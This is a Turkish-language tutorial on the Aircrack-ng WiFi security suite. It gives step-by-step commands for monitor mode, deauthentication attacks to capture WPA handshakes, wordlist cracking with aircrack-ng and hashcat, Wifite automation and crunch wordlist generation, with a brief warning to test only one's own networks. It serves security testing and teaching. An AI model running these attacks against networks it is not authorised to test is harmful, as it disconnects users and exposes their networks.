📡 Aircrack-ng

Kablosuz Ağ Güvenliği ve Şifre Kırma Paketi

📌 Aircrack-ng Nedir?

Aircrack-ng, WiFi ağlarının güvenliğini test etmek için kullanılan bir araç koleksiyonudur. Paket yakalama, WEP/WPA/WPA2 şifre kırma, sahte erişim noktası oluşturma gibi işlemler yapabilir.

⚠️ Önemli: Bu araçları yalnızca kendi ağlarınızda test amaçlı kullanın. İzinsiz kullanım yasadışıdır.

🛠️ Gerekli Donanım

  • Monitor mode destekleyen WiFi adaptör (gerekli)
  • Önerilen: Alfa Networks AWUS036ACH, AWUS036NHA, TP-Link TL-WN722N v1
  • USB adaptörler masaüstünde daha iyi çalışır
  • Dahili laptop WiFi genelde yetersizdir

    • 🎯 Aircrack-ng Araçları

  • airmon-ng: Monitor mode yönetimi
  • airodump-ng: Ağ ve istemci taraması
  • aireplay-ng: Paket enjeksiyonu ve deauth
  • aircrack-ng: Şifre kırma
  • airbase-ng: Sahte erişim noktası
  • airolib-ng: WPA hash veritabanı

    • 📋 Temel Kullanım Adımları

    # 1) Adaptörü monitor moduna al
sudo airmon-ng start wlan0

# Çıktı: (monitor mode enabled on wlan0mon)

# 2) Çevredeki ağları tara
sudo airodump-ng wlan0mon

# Çıktıda göreceğin sütunlar:
# BSSID (AP MAC), PWR, CH (kanal), ENC (şifreleme), ESSID (ağ adı)

# 3) Belirli bir ağa odaklan
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w yakalanan wlan0mon

# -c: kanal
# --bssid: hedef AP MAC adresi
# -w: dosya adı (yakalanan-01.cap olarak kaydedilir)

# 4) WPA Handshake yakalamak için deauth saldırısı
# (Yeni terminalde)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c FF:FF:FF:FF:FF:FF wlan0mon

# -0: deauth
# 5: 5 kez gönder
# -a: hedef AP
# -c: hedef istemci (broadcast tüm istemciler)

# Ekranda "WPA handshake: AA:BB:CC:DD:EE:FF" görünce handshake yakalandı

# 5) Şifre kırma
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt yakalanan-01.cap

# -w: wordlist (kelime listesi)
# rockyou.txt en popüler wordlisttir

    ⚙️ Ek Faydalı Komutlar

    # Monitor mode kapatma
sudo airmon-ng stop wlan0mon

# Ağ adaptörünü yeniden başlatma
sudo systemctl restart NetworkManager

# İşlemci tespiti
airmon-ng

# Sürücü kontrol
airmon-ng check

# Belirli ESSID için kırma
aircrack-ng -w wordlist.txt -e "WiFi_Adi" capture.cap

# Birden fazla capture dosyası
aircrack-ng -w wordlist.txt capture1.cap capture2.cap

# Sadece AP MAC ile
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap

# GPU hızlandırmalı kırma (hashcat ile)
# önce hcxtools kullanarak dönüştür
hcxcaptool -z capture.16800 yakalanan-01.cap
hashcat -m 16800 capture.16800 wordlist.txt

# WEP kırma (WEP günümüzde neredeyse kullanılmıyor)
aircrack-ng -z yakalanan-01.cap

    💡 Otomasyon: Wifite

    Wifite, Aircrack-ng'yi otomatikleştiren bir araçtır. Tek komutla handshake yakalama ve kırma yapar.

    # Tüm ağları otomatik test et
sudo wifite

# Belirli şifrelemeye odaklan
sudo wifite --wpa
sudo wifite --wep

# Belirli kanal
sudo wifite -c 6

# Zaman aşımı
sudo wifite --time 600

# Belirli wordlist
sudo wifite --dict /usr/share/wordlists/rockyou.txt

# 5GHz bandı
sudo wifite --5ghz

    🔒 Wordlist'ler (Kelime Listeleri)

  • rockyou.txt: En popüler, 14 milyon şifre - /usr/share/wordlists/rockyou.txt
  • darkweb2017-top10000.txt: Popüler 10K şifre
  • SecLists: Çeşitli wordlist koleksiyonu (GitHub'dan indir)
  • Kendi wordlist'ini oluştur: crunch 8 12 -o liste.txt (8-12 karakter)
    • # crunch ile wordlist oluşturma
crunch 8 12 -o /tmp/wordlist.txt

# Sadece rakamlar
crunch 8 8 0123456789 -o rakam.txt

# Belirli karakterler
crunch 6 6 abcdef123 -o ozel.txt

# Wordlist indir
sudo apt install seclists
# veya
git clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists
